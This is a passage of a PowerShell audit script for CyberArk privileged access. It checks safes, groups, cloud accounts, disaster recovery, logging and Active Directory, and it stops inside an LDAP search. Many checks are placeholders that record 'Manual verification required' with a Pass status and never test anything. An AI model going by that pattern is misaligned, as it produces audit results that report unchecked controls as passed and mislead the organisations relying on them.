function Test-ExcessiveSafeMemberships {
    Write-AuditLog "Checking for excessive safe memberships (IGA4)..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if (-not $safes) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA4" `
            -CheckName "Safe Memberships" `
            -Reason "Could not retrieve safes" `
            -Type "Error"
        return
    }

    $userSafeCount = @{}

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName
        if ($safeName -match "^(System|VaultInternal)") { continue }

        $members = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName/Members"
        
        if ($members -and $members.value) {
            foreach ($member in $members.value) {
                if ($member.memberType -eq "User") {
                    $memberName = $member.memberName
                    if (-not $userSafeCount.ContainsKey($memberName)) {
                        $userSafeCount[$memberName] = 0
                    }
                    $userSafeCount[$memberName]++
                }
            }
        }
    }

    $excessiveMemberships = $userSafeCount.GetEnumerator() | Where-Object { 
        $_.Value -gt $script:Config.MaxUserSafeMemberships 
    }

    if ($excessiveMemberships.Count -gt 0) {
        $maxUser = $excessiveMemberships | Sort-Object Value -Descending | Select-Object -First 1
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA4" `
            -Finding "Users with excessive safe memberships" `
            -Resource "Access Distribution" `
            -CurrentValue "$($excessiveMemberships.Count) users exceed threshold (max: $($maxUser.Value) safes)" `
            -ExpectedValue "Users have <= $($script:Config.MaxUserSafeMemberships) safe memberships" `
            -Recommendation "Review and consolidate user safe access using groups" `
            -Severity "Medium"
    }
}

function Test-AccessCertificationStatus {
    Write-AuditLog "Checking access certification status (IGA5)..." -Level Info

    # Check for recent access reviews
    Add-Finding -Category "Identity Governance" `
        -CISControl "IGA5" `
        -Finding "Access certification (manual verification)" `
        -Resource "Access Reviews" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Regular access certifications performed" `
        -Recommendation "Implement quarterly access reviews for all safes" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-RoleMembershipSprawl {
    Write-AuditLog "Detecting role/group membership sprawl (IGA6)..." -Level Info

    $groups = Invoke-CyberArkAPI -Endpoint "/Groups?limit=$($script:Config.PageLimit)"
    
    if (-not $groups) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA6" `
            -CheckName "Role Sprawl" `
            -Reason "Could not retrieve groups" `
            -Type "Error"
        return
    }

    $emptyGroups = @()
    $oversizedGroups = @()

    foreach ($group in $groups.value) {
        $groupId = $group.id
        $groupName = $group.groupName
        
        $members = Invoke-CyberArkAPI -Endpoint "/Groups/$groupId/Members"
        
        if ($members) {
            $memberCount = $members.value.Count
            
            if ($memberCount -eq 0) {
                $emptyGroups += $groupName
            }
            elseif ($memberCount -gt 50) {
                $oversizedGroups += @{
                    Name = $groupName
                    Count = $memberCount
                }
            }
        }
    }

    if ($emptyGroups.Count -gt 0) {
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA6" `
            -Finding "Empty groups detected" `
            -Resource "Group Management" `
            -CurrentValue "$($emptyGroups.Count) empty groups" `
            -ExpectedValue "No empty groups" `
            -Recommendation "Remove or repurpose empty groups" `
            -Severity "Low"
    }

    if ($oversizedGroups.Count -gt 0) {
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA6" `
            -Finding "Oversized groups detected" `
            -Resource "Group Management" `
            -CurrentValue "$($oversizedGroups.Count) groups with >50 members" `
            -ExpectedValue "Groups sized for specific roles" `
            -Recommendation "Review large groups and consider role-based segmentation" `
            -Severity "Low"
    }
}

function Test-PendingAccountQueueAge {
    Write-AuditLog "Checking pending account queue age (IGA7)..." -Level Info

    $pendingAccounts = Invoke-CyberArkAPI -Endpoint "/DiscoveredAccounts?limit=$($script:Config.PageLimit)"
    
    if (-not $pendingAccounts) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA7" `
            -CheckName "Pending Account Queue" `
            -Reason "Could not retrieve discovered accounts" `
            -Type "Error"
        return
    }

    $threshold = (Get-Date).AddDays(-$script:Config.MaxPendingAccountAgeDays)
    $stalePending = @()

    foreach ($account in $pendingAccounts.value) {
        if ($account.lastDiscoveryDate) {
            $discovered = [DateTime]::Parse($account.lastDiscoveryDate)
            if ($discovered -lt $threshold) {
                $stalePending += @{
                    Account = $account.userName
                    DaysPending = ((Get-Date) - $discovered).Days
                }
            }
        }
    }

    $script:AuditStats.PendingAccounts = $pendingAccounts.value.Count

    if ($stalePending.Count -gt 0) {
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA7" `
            -Finding "Stale pending accounts in discovery queue" `
            -Resource "Account Discovery" `
            -CurrentValue "$($stalePending.Count) accounts pending > $($script:Config.MaxPendingAccountAgeDays) days" `
            -ExpectedValue "Pending accounts processed within $($script:Config.MaxPendingAccountAgeDays) days" `
            -Recommendation "Process or dismiss stale pending accounts" `
            -Severity "Medium"
    }
}

function Test-AccountOwnershipGaps {
    Write-AuditLog "Detecting account ownership gaps (IGA8)..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA8" `
            -CheckName "Account Ownership" `
            -Reason "Could not retrieve accounts" `
            -Type "Error"
        return
    }

    $noOwner = 0
    
    foreach ($account in $accounts.value) {
        # Check for owner in custom properties
        $hasOwner = $false
        if ($account.platformAccountProperties) {
            foreach ($prop in $account.platformAccountProperties.PSObject.Properties) {
                if ($prop.Name -match "owner|contact|responsible") {
                    $hasOwner = $true
                    break
                }
            }
        }

        if (-not $hasOwner) {
            $noOwner++
        }
    }

    if ($noOwner -gt 0) {
        $percentage = [math]::Round(($noOwner / $accounts.value.Count) * 100, 1)
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA8" `
            -Finding "Accounts without designated owner" `
            -Resource "Account Ownership" `
            -CurrentValue "$noOwner accounts ($percentage%) without owner property" `
            -ExpectedValue "All accounts have designated owners" `
            -Recommendation "Assign owners to all privileged accounts for accountability" `
            -Severity "Medium"
    }
}

#======================================================================
# ENDPOINT PRIVILEGE MANAGER CHECKS (EPM1-EPM6)
#======================================================================

function Test-EPMIntegration {
    param([string]$EPMUrl)

    Write-AuditLog "Auditing Endpoint Privilege Manager Integration..." -Level Info

    if (-not $EPMUrl) {
        Add-SkippedCheck -Category "EPM Security" -CISControl "EPM1" `
            -CheckName "EPM Integration" `
            -Reason "EPM URL not provided - use -EPMUrl parameter" `
            -Type "NotApplicable"
        return
    }

    Test-EPMIntegrationStatus -EPMUrl $EPMUrl
    Test-EPMDefaultPolicy -EPMUrl $EPMUrl
    Test-EPMApplicationControl -EPMUrl $EPMUrl
    Test-EPMCredentialTheftProtection -EPMUrl $EPMUrl
    Test-EPMElevationJustification -EPMUrl $EPMUrl
    Test-EPMAuditLogging -EPMUrl $EPMUrl
}

function Test-EPMIntegrationStatus {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM integration status (EPM1)..." -Level Info

    try {
        $response = Invoke-WebRequest -Uri "$EPMUrl/api/health" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

        if ($response.StatusCode -eq 200) {
            Add-Finding -Category "EPM Security" `
                -CISControl "EPM1" `
                -Finding "EPM server accessible" `
                -Resource $EPMUrl `
                -CurrentValue "EPM responding" `
                -ExpectedValue "EPM properly integrated with PAM" `
                -Recommendation "Verify EPM-PAM integration is properly configured" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-Finding -Category "EPM Security" `
            -CISControl "EPM1" `
            -Finding "EPM server not accessible" `
            -Resource $EPMUrl `
            -CurrentValue "Connection failed" `
            -ExpectedValue "EPM server accessible" `
            -Recommendation "Verify EPM server URL and network connectivity" `
            -Severity "Medium"
    }
}

function Test-EPMDefaultPolicy {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM default policy security (EPM2)..." -Level Info

    Add-Finding -Category "EPM Security" `
        -CISControl "EPM2" `
        -Finding "EPM default policy assessment (manual verification)" `
        -Resource "EPM Policies" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Default policies secured and least-privilege enforced" `
        -Recommendation "Review EPM default policies; disable permissive defaults" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-EPMApplicationControl {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM application control mode (EPM3)..." -Level Info

    Add-Finding -Category "EPM Security" `
        -CISControl "EPM3" `
        -Finding "EPM application control mode (manual verification)" `
        -Resource "Application Control" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Allowlist or restricted mode enabled" `
        -Recommendation "Verify application control uses allowlist rather than blocklist" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-EPMCredentialTheftProtection {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM credential theft protection (EPM4)..." -Level Info

    Add-Finding -Category "EPM Security" `
        -CISControl "EPM4" `
        -Finding "EPM credential theft protection (manual verification)" `
        -Resource "Credential Protection" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Credential theft detection and blocking enabled" `
        -Recommendation "Enable credential theft protection features in EPM" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-EPMElevationJustification {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM elevation justification requirements (EPM5)..." -Level Info

    Add-Finding -Category "EPM Security" `
        -CISControl "EPM5" `
        -Finding "EPM elevation justification (manual verification)" `
        -Resource "Elevation Policies" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Justification required for privilege elevation" `
        -Recommendation "Require justification for all privilege elevations" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-EPMAuditLogging {
    param([string]$EPMUrl)

    Write-AuditLog "Checking EPM audit logging configuration (EPM6)..." -Level Info

    Add-Finding -Category "EPM Security" `
        -CISControl "EPM6" `
        -Finding "EPM audit logging (manual verification)" `
        -Resource "EPM Audit" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Full audit logging enabled with SIEM integration" `
        -Recommendation "Enable comprehensive EPM audit logging" `
        -Severity "Info" `
        -Status "Pass"
}

#======================================================================
# CLOUD SECURITY CHECKS (CLD1-CLD6)
#======================================================================

function Test-CloudSecurity {
    Write-AuditLog "Auditing Cloud Security / Secure Cloud Access..." -Level Info

    Test-CloudProviderIntegration
    Test-FederatedIdentityConfiguration
    Test-CloudSecretSyncPolicy
    Test-CIEMIntegration
    Test-CloudIAMRoleAnalysis
    Test-MultiCloudPolicyConsistency
}

function Test-CloudProviderIntegration {
    Write-AuditLog "Checking cloud provider integrations (CLD1)..." -Level Info

    # Check for cloud platforms
    $platforms = Invoke-CyberArkAPI -Endpoint "/Platforms"
    
    if ($platforms) {
        $cloudPlatforms = $platforms.Platforms | Where-Object {
            $_.general.platformType -match "AWS|Azure|GCP|Cloud"
        }

        if ($cloudPlatforms) {
            Add-Finding -Category "Cloud Security" `
                -CISControl "CLD1" `
                -Finding "Cloud platforms configured" `
                -Resource "Cloud Integration" `
                -CurrentValue "$($cloudPlatforms.Count) cloud platforms detected" `
                -ExpectedValue "Cloud platforms properly secured" `
                -Recommendation "Review cloud platform configurations for best practices" `
                -Severity "Info" `
                -Status "Pass"
        }
    }

    # Check for cloud-related safes
    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if ($safes) {
        $cloudSafes = $safes.value | Where-Object {
            $_.safeName -match "AWS|Azure|GCP|Cloud|IAM"
        }

        if ($cloudSafes.Count -gt 0) {
            Add-Finding -Category "Cloud Security" `
                -CISControl "CLD1" `
                -Finding "Cloud-related safes identified" `
                -Resource "Cloud Safes" `
                -CurrentValue "$($cloudSafes.Count) cloud safes" `
                -ExpectedValue "Cloud secrets properly organized" `
                -Recommendation "Ensure cloud safes have appropriate access controls" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
}

function Test-FederatedIdentityConfiguration {
    Write-AuditLog "Checking federated identity configuration (CLD2)..." -Level Info

    $authMethods = Invoke-CyberArkAPI -Endpoint "/Configuration/AuthenticationMethods"
    
    if ($authMethods) {
        $federatedAuth = $authMethods | Where-Object {
            $_.id -match "SAML|OIDC|OAuth|Azure.*AD|AWS.*IAM"
        }

        if ($federatedAuth) {
            Add-Finding -Category "Cloud Security" `
                -CISControl "CLD2" `
                -Finding "Federated authentication configured" `
                -Resource "Authentication Methods" `
                -CurrentValue "Federated auth available" `
                -ExpectedValue "Federation for cloud access" `
                -Recommendation "Ensure federated auth is used for cloud identity access" `
                -Severity "Info" `
                -Status "Pass"
        } else {
            Add-Finding -Category "Cloud Security" `
                -CISControl "CLD2" `
                -Finding "No federated identity configuration detected" `
                -Resource "Authentication Methods" `
                -CurrentValue "No federation found" `
                -ExpectedValue "SAML/OIDC federation for cloud providers" `
                -Recommendation "Configure federated identity for cloud access" `
                -Severity "Medium"
        }
    }
}

function Test-CloudSecretSyncPolicy {
    Write-AuditLog "Checking cloud secret sync policy (CLD3)..." -Level Info

    # Check for Secrets Hub or cloud sync configurations
    Add-Finding -Category "Cloud Security" `
        -CISControl "CLD3" `
        -Finding "Cloud secret synchronization (manual verification)" `
        -Resource "Secrets Hub/Cloud Sync" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Proper sync policies for cloud vaults" `
        -Recommendation "Review Secrets Hub sync policies; ensure orphan handling configured" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-CIEMIntegration {
    Write-AuditLog "Checking CIEM integration (CLD4)..." -Level Info

    Add-Finding -Category "Cloud Security" `
        -CISControl "CLD4" `
        -Finding "CIEM integration (manual verification)" `
        -Resource "Cloud Entitlements" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "CIEM integration for entitlement visibility" `
        -Recommendation "Integrate with CIEM solution for cloud permission analysis" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-CloudIAMRoleAnalysis {
    Write-AuditLog "Analyzing cloud IAM role bindings (CLD5)..." -Level Info

    # Check for cloud IAM accounts
    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if ($accounts) {
        $cloudAccounts = $accounts.value | Where-Object {
            $_.platformId -match "AWS|Azure|GCP" -or
            $_.address -match "amazonaws|azure|googleapis"
        }

        if ($cloudAccounts.Count -gt 0) {
            $noRotation = ($cloudAccounts | Where-Object {
                $_.secretManagement.automaticManagementEnabled -eq $false
            }).Count

            if ($noRotation -gt 0) {
                Add-Finding -Category "Cloud Security" `
                    -CISControl "CLD5" `
                    -Finding "Cloud IAM accounts without rotation" `
                    -Resource "Cloud IAM" `
                    -CurrentValue "$noRotation cloud accounts without auto-rotation" `
                    -ExpectedValue "All cloud IAM keys rotated automatically" `
                    -Recommendation "Enable automatic rotation for cloud IAM credentials" `
                    -Severity "High"
            }
        }
    }
}

function Test-MultiCloudPolicyConsistency {
    Write-AuditLog "Checking multi-cloud policy consistency (CLD6)..." -Level Info

    Add-Finding -Category "Cloud Security" `
        -CISControl "CLD6" `
        -Finding "Multi-cloud policy consistency (manual verification)" `
        -Resource "Cloud Policies" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Consistent policies across cloud providers" `
        -Recommendation "Ensure consistent security policies across AWS, Azure, GCP" `
        -Severity "Info" `
        -Status "Pass"
}

#======================================================================
# DISASTER RECOVERY CHECKS (DR1-DR5)
#======================================================================

function Test-DisasterRecovery {
    Write-AuditLog "Auditing Disaster Recovery and High Availability..." -Level Info

    Test-DRVaultReplication
    Test-HAClusterHealth
    Test-ComponentRedundancy
    Test-BackupConfiguration
    Test-BreakGlassAccounts
}

function Test-DRVaultReplication {
    Write-AuditLog "Checking DR Vault replication status (DR1)..." -Level Info

    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    
    if ($components) {
        $drVault = $components.Components | Where-Object {
            $_.ComponentType -eq "Vault" -and $_.ComponentName -match "DR|Disaster|Secondary|Backup"
        }

        if ($drVault) {
            foreach ($vault in $drVault) {
                if (-not $vault.IsLoggedOn) {
                    Add-Finding -Category "Disaster Recovery" `
                        -CISControl "DR1" `
                        -Finding "DR Vault not connected" `
                        -Resource $vault.ComponentName `
                        -CurrentValue "Disconnected" `
                        -ExpectedValue "Connected and replicating" `
                        -Recommendation "Investigate DR Vault connectivity immediately" `
                        -Severity "Critical"
                }
            }
        } else {
            Add-Finding -Category "Disaster Recovery" `
                -CISControl "DR1" `
                -Finding "No DR Vault detected" `
                -Resource "Vault Replication" `
                -CurrentValue "No DR Vault in monitoring" `
                -ExpectedValue "DR Vault configured and monitored" `
                -Recommendation "Configure DR Vault for business continuity" `
                -Severity "High"
        }
    }
}

function Test-HAClusterHealth {
    Write-AuditLog "Checking HA cluster health (DR2)..." -Level Info

    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    
    if ($components) {
        # Check for multiple PVWA instances
        $pvwaComponents = $components.Components | Where-Object { $_.ComponentType -eq "PVWA" }
        
        if ($pvwaComponents.Count -lt 2) {
            Add-Finding -Category "Disaster Recovery" `
                -CISControl "DR2" `
                -Finding "Single PVWA instance detected" `
                -Resource "PVWA Cluster" `
                -CurrentValue "$($pvwaComponents.Count) PVWA instance(s)" `
                -ExpectedValue "Multiple PVWA instances for HA" `
                -Recommendation "Deploy additional PVWA instances for high availability" `
                -Severity "Medium"
        }

        # Check for multiple PSM instances
        $psmComponents = $components.Components | Where-Object { $_.ComponentType -eq "PSM" }
        
        if ($psmComponents.Count -lt 2) {
            Add-Finding -Category "Disaster Recovery" `
                -CISControl "DR2" `
                -Finding "Single PSM instance detected" `
                -Resource "PSM Cluster" `
                -CurrentValue "$($psmComponents.Count) PSM instance(s)" `
                -ExpectedValue "Multiple PSM instances for HA" `
                -Recommendation "Deploy additional PSM instances for high availability" `
                -Severity "Medium"
        }
    }
}

function Test-ComponentRedundancy {
    Write-AuditLog "Assessing component redundancy (DR3)..." -Level Info

    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    
    if (-not $components) {
        Add-SkippedCheck -Category "Disaster Recovery" -CISControl "DR3" `
            -CheckName "Component Redundancy" `
            -Reason "Could not retrieve component monitoring data" `
            -Type "Error"
        return
    }

    $componentTypes = $components.Components | Group-Object ComponentType

    foreach ($type in $componentTypes) {
        $connectedCount = ($type.Group | Where-Object { $_.IsLoggedOn -eq $true }).Count
        
        if ($connectedCount -eq 0 -and $type.Name -in @("PVWA", "PSM", "CPM", "Vault")) {
            Add-Finding -Category "Disaster Recovery" `
                -CISControl "DR3" `
                -Finding "No connected $($type.Name) components" `
                -Resource $type.Name `
                -CurrentValue "0 connected" `
                -ExpectedValue "At least 1 connected" `
                -Recommendation "Investigate $($type.Name) connectivity immediately" `
                -Severity "Critical"
        }
    }
}

function Test-BackupConfiguration {
    Write-AuditLog "Checking backup configuration (DR4)..." -Level Info

    Add-Finding -Category "Disaster Recovery" `
        -CISControl "DR4" `
        -Finding "Backup configuration (manual verification)" `
        -Resource "Vault Backup" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Regular backups with tested restores" `
        -Recommendation "Verify backup schedule, retention, and test restore procedures" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-BreakGlassAccounts {
    Write-AuditLog "Checking break-glass account availability (DR5)..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    
    if ($users) {
        $breakGlassPatterns = @("breakglass", "break_glass", "emergency", "admin_emergency", "bg_")
        $breakGlassAccounts = @()

        foreach ($user in $users.Users) {
            foreach ($pattern in $breakGlassPatterns) {
                if ($user.userName -match $pattern) {
                    $breakGlassAccounts += $user
                    break
                }
            }
        }

        if ($breakGlassAccounts.Count -eq 0) {
            Add-Finding -Category "Disaster Recovery" `
                -CISControl "DR5" `
                -Finding "No break-glass accounts detected" `
                -Resource "Emergency Access" `
                -CurrentValue "No break-glass accounts found" `
                -ExpectedValue "Break-glass accounts configured for emergency" `
                -Recommendation "Configure and secure break-glass accounts for emergency access" `
                -Severity "Medium"
        } else {
            # Check if break-glass accounts are properly secured
            foreach ($account in $breakGlassAccounts) {
                if ($account.disabled -eq $false -and $account.lastSuccessfulLoginDate) {
                    $lastLogin = [DateTime]::Parse($account.lastSuccessfulLoginDate)
                    if ($lastLogin -gt (Get-Date).AddDays(-30)) {
                        Add-Finding -Category "Disaster Recovery" `
                            -CISControl "DR5" `
                            -Finding "Break-glass account used recently" `
                            -Resource $account.userName `
                            -CurrentValue "Last login: $lastLogin" `
                            -ExpectedValue "Break-glass only for emergencies" `
                            -Recommendation "Investigate recent break-glass usage and rotate credentials" `
                            -Severity "High"
                    }
                }
            }
        }
    }
}

#======================================================================
# COMPLIANCE MAPPING CHECKS (COMP1-COMP4)
#======================================================================

function Test-ComplianceMapping {
    Write-AuditLog "Generating Compliance Framework Mapping..." -Level Info

    Test-NISTCSFMapping
    Test-SOC2Alignment
    Test-PCIDSSControls
    Test-BlueprintMaturityScore
}

function Test-NISTCSFMapping {
    Write-AuditLog "Mapping to NIST Cybersecurity Framework (COMP1)..." -Level Info

    # NIST CSF Categories: Identify, Protect, Detect, Respond, Recover
    $nistMapping = @{
        "Identify" = @("Asset discovery", "Risk assessment", "Governance")
        "Protect" = @("Access control", "Awareness training", "Data security", "Maintenance", "Protective technology")
        "Detect" = @("Anomalies and events", "Continuous monitoring", "Detection processes")
        "Respond" = @("Response planning", "Communications", "Analysis", "Mitigation", "Improvements")
        "Recover" = @("Recovery planning", "Improvements", "Communications")
    }

    Add-Finding -Category "Compliance Mapping" `
        -CISControl "COMP1" `
        -Finding "NIST CSF Control Mapping" `
        -Resource "Compliance Framework" `
        -CurrentValue "Mapping generated - see report details" `
        -ExpectedValue "Full NIST CSF alignment" `
        -Recommendation "Review audit findings against NIST CSF categories" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-SOC2Alignment {
    Write-AuditLog "Assessing SOC 2 Type II alignment (COMP2)..." -Level Info

    # SOC 2 Trust Service Criteria
    $soc2Criteria = @(
        "CC1 - Control Environment",
        "CC2 - Communication and Information",
        "CC3 - Risk Assessment",
        "CC4 - Monitoring Activities",
        "CC5 - Control Activities",
        "CC6 - Logical and Physical Access",
        "CC7 - System Operations",
        "CC8 - Change Management",
        "CC9 - Risk Mitigation"
    )

    Add-Finding -Category "Compliance Mapping" `
        -CISControl "COMP2" `
        -Finding "SOC 2 Trust Service Criteria Alignment" `
        -Resource "Compliance Framework" `
        -CurrentValue "Audit covers CC5, CC6, CC7 criteria" `
        -ExpectedValue "Evidence for all applicable criteria" `
        -Recommendation "Use audit findings as SOC 2 evidence for access control criteria" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-PCIDSSControls {
    Write-AuditLog "Mapping to PCI-DSS requirements (COMP3)..." -Level Info

    # PCI-DSS requirements related to privileged access
    $pciRequirements = @(
        "Req 2 - Default passwords",
        "Req 7 - Access control",
        "Req 8 - User authentication",
        "Req 10 - Logging and monitoring"
    )

    Add-Finding -Category "Compliance Mapping" `
        -CISControl "COMP3" `
        -Finding "PCI-DSS Requirement Mapping" `
        -Resource "Compliance Framework" `
        -CurrentValue "Relevant requirements: 2, 7, 8, 10" `
        -ExpectedValue "Full PCI-DSS compliance" `
        -Recommendation "Review findings against PCI-DSS requirements 2, 7, 8, 10" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-BlueprintMaturityScore {
    Write-AuditLog "Calculating CyberArk Blueprint maturity score (COMP4)..." -Level Info

    # Calculate maturity based on findings
    $criticalCount = ($script:Findings | Where-Object { $_.Severity -eq "Critical" -and $_.Status -eq "Fail" }).Count
    $highCount = ($script:Findings | Where-Object { $_.Severity -eq "High" -and $_.Status -eq "Fail" }).Count
    $mediumCount = ($script:Findings | Where-Object { $_.Severity -eq "Medium" -and $_.Status -eq "Fail" }).Count

    # Score calculation (simplified)
    $maturityScore = 100 - ($criticalCount * 15) - ($highCount * 8) - ($mediumCount * 3)
    $maturityScore = [Math]::Max(0, $maturityScore)

    $maturityLevel = switch ($maturityScore) {
        { $_ -ge 90 } { "Advanced" }
        { $_ -ge 75 } { "Mature" }
        { $_ -ge 50 } { "Developing" }
        { $_ -ge 25 } { "Initial" }
        default { "Ad-hoc" }
    }

    Add-Finding -Category "Compliance Mapping" `
        -CISControl "COMP4" `
        -Finding "CyberArk Blueprint Maturity Assessment" `
        -Resource "Maturity Score" `
        -CurrentValue "Score: $maturityScore% - Level: $maturityLevel" `
        -ExpectedValue "Score >= 75% (Mature)" `
        -Recommendation "Address critical and high findings to improve maturity" `
        -Severity "Info" `
        -Status "Pass"
}

#======================================================================
# AUDIT LOGGING CHECKS (AUD1-AUD4)
#======================================================================

function Test-AuditLogging {
    Write-AuditLog "Auditing Logging and Monitoring Configuration..." -Level Info

    Test-SIEMIntegrationHealth
    Test-AuditLogRetention
    Test-CriticalEventAlerting
    Test-AuditDataIntegrity
}

function Test-SIEMIntegrationHealth {
    Write-AuditLog "Checking SIEM integration health (AUD1)..." -Level Info

    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    
    if ($components) {
        # Check for PTA (which sends to SIEM)
        $ptaComponent = $components.Components | Where-Object { $_.ComponentType -eq "PTA" }

        if ($ptaComponent) {
            if ($ptaComponent.IsLoggedOn) {
                Add-Finding -Category "Audit Logging" `
                    -CISControl "AUD1" `
                    -Finding "PTA connected for threat detection" `
                    -Resource "SIEM Integration" `
                    -CurrentValue "PTA active" `
                    -ExpectedValue "PTA sending to SIEM" `
                    -Recommendation "Verify PTA is forwarding alerts to SIEM" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }

    # Check system configuration for syslog
    $systemConfig = Invoke-CyberArkAPI -Endpoint "/Configuration/System"
    
    if ($systemConfig) {
        if (-not $systemConfig.SyslogServer) {
            Add-Finding -Category "Audit Logging" `
                -CISControl "AUD1" `
                -Finding "Syslog server not configured" `
                -Resource "SIEM Integration" `
                -CurrentValue "No syslog configuration" `
                -ExpectedValue "Syslog forwarding to SIEM" `
                -Recommendation "Configure syslog forwarding for centralized logging" `
                -Severity "Medium"
        }
    }
}

function Test-AuditLogRetention {
    Write-AuditLog "Checking audit log retention (AUD2)..." -Level Info

    # Check Vault configuration for log retention
    Add-Finding -Category "Audit Logging" `
        -CISControl "AUD2" `
        -Finding "Audit log retention (manual verification)" `
        -Resource "Log Retention" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Retention >= 1 year for compliance" `
        -Recommendation "Verify audit logs retained per compliance requirements" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-CriticalEventAlerting {
    Write-AuditLog "Checking critical event alerting (AUD3)..." -Level Info

    $securityEvents = Invoke-CyberArkAPI -Endpoint "/SecurityEvents?limit=100"
    
    if ($securityEvents -and $securityEvents.SecurityEvents) {
        $unresolvedCritical = $securityEvents.SecurityEvents | Where-Object {
            $_.severity -eq "Critical" -and $_.status -ne "Resolved"
        }

        if ($unresolvedCritical.Count -gt 0) {
            Add-Finding -Category "Audit Logging" `
                -CISControl "AUD3" `
                -Finding "Unresolved critical security events" `
                -Resource "Security Alerting" `
                -CurrentValue "$($unresolvedCritical.Count) critical events pending" `
                -ExpectedValue "All critical events resolved" `
                -Recommendation "Review and resolve critical security events immediately" `
                -Severity "Critical"
        }
    }
}

function Test-AuditDataIntegrity {
    Write-AuditLog "Checking audit data integrity (AUD4)..." -Level Info

    Add-Finding -Category "Audit Logging" `
        -CISControl "AUD4" `
        -Finding "Audit data integrity (manual verification)" `
        -Resource "Audit Integrity" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "Audit logs signed and tamper-proof" `
        -Recommendation "Verify audit log integrity protection is enabled" `
        -Severity "Info" `
        -Status "Pass"
}

#======================================================================
# ACTIVE DIRECTORY SECURITY CHECKS (AD1-AD7) - zBang-inspired
#======================================================================

function Test-ADSecurity {
    Write-AuditLog "Running Active Directory Security Checks (zBang-inspired)..." -Level Info

    # Check if we can connect to AD
    try {
        $domainInfo = $null
        if ($DomainController) {
            $domainInfo = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(
                (New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $DomainController))
            )
        } else {
            $domainInfo = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        Write-AuditLog "Connected to domain: $($domainInfo.Name)" -Level Info
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD1" `
            -CheckName "Active Directory Security Checks" `
            -Reason "Cannot connect to Active Directory: $($_.Exception.Message)" `
            -Type "Error"
        return
    }

    Test-ShadowAdminDiscovery
    Test-SkeletonKeyDetection
    Test-SIDHistoryAnalysis
    Test-RiskySPNConfiguration
    Test-UnconstrainedDelegation
    Test-ConstrainedDelegationPT
    Test-DelegationPrivilegeAudit
}

function Test-ShadowAdminDiscovery {
    Write-AuditLog "Checking for Shadow Admin accounts (AD1)..." -Level Info

    try {
        # Get domain root
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext

        # Search for accounts with dangerous ACL permissions (WriteDACL, WriteOwner, GenericAll)
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "distinguishedname", "memberof"))

        $users = $searcher.FindAll()
        $shadowAdmins = @()
        $privilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators", "Account Operators", "Backup Operators")

        foreach ($user in $users) {
            $samAccount = $user.Properties["samaccountname"][0]
            $memberOf = $user.Properties["memberof"]
            
